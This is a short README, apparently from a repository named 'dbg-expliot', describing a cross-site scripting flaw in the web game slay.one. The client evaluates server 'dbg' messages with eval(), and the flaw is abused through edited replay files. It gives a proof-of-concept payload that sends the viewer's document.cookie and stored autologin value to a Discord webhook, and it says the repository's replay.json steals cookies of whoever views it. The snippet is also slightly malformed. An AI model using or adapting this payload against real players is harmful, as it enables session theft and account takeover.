# dbg-expliot

### Introduction 
Slay.one is a top down pixel shooter on the web. Howeever, like many web apppilcations it can be vulerible to cross-site sripting attacks.

### PoC 
Within the slay.one client-bundle.js, the section of code that handles websocket messages from the server there is a few lines of code that put the user in jepordy. 

```javascript
else if ("dbg" === arr[0]) // dbg packet send from the server 
    try {
        eval(msg.substring(4)) // eval() can be used to execute code 
    } catch (e) {}
```

This can be explioted with slay.one's replay feature where users can download replays of thier games. However, replay's can be editted to execute malicous code on the brower.

As a proof of concept the replay.json file in the repo if viewed on slay.one will steal your cookies and send it to a discord webhook 

```javascript
dbg$fetch('https://discord.com/api/webhooks/{webhookID}/{webhookToken}{
    method: 
        'POST',headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({content: 'Stolen Cookies: ' 
    + document.cookie + 'Login' + localStorage.autologin})
});
```
